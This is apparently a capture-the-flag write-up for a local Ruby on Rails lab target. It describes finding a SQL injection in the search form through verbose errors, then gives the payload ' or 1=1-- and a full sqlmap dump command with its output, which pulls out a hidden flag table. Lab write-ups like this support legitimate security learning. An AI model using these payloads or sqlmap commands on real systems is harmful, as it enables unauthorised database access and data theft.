This one presents only a search bar and no other outlinks. The search bar redirects to back to root (/) with a POST requests with params search=<val>. So, this appears to be some dynamic web server. In testing, (looking for a robots.txt file) it presented an error message indicating 'application_controller.rb' has an issue. Some seraching showed that this was a ruby on rails server. Also, it shows that default error messages are not surpressed which makes the search bar seem like a target for SQLi. In testing, yes, it has an SQLi vulnerability which, when triggered, dumps the full query back via the web page.

SQLite3::SQLException: near ")": syntax error: SELECT * FROM reviews WHERE title LIKE '%' or 1=1) --#%'
	
SQLi query will dump all the records:
	* ' or 1=1--

DB is SQLLite 3 as indicated above.

So, used SQL map

```bash
sqlmap -u http://localhost:9001/ --data="search=test" -a
```

And so doing, exfiled a table with the link to the image.

```bash
[19:45:02] [INFO] fetching entries for table 'hidden' in database 'SQLite_masterdb'
[19:45:02] [INFO] fetching number of entries for table 'hidden' in database 'SQLite_masterdb'
[19:45:02] [INFO] retrieved: 1
[19:45:15] [INFO] retrieved: 2_of_spades
[19:51:01] [INFO] retrieved: 1
[19:51:46] [INFO] retrieved: /eGHaMBu2XWvRA5cu/2_of_spades.png
Database: SQLite_masterdb
Table: hidden
[1 entry]
+----+-------------+-----------------------------------+
| id | flag        | link                              |
+----+-------------+-----------------------------------+
| 1  | 2_of_spades | /eGHaMBu2XWvRA5cu/2_of_spades.png |
+----+-------------+-----------------------------------+

[20:09:34] [INFO] table 'SQLite_masterdb.hidden' dumped to CSV file '/root/.local/share/sqlmap/output/localhost/dump/SQLite_masterdb/hidden.csv'
[20:09:34] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/localhost'

[*] ending @ 20:09:34 /2020-12-06/
```
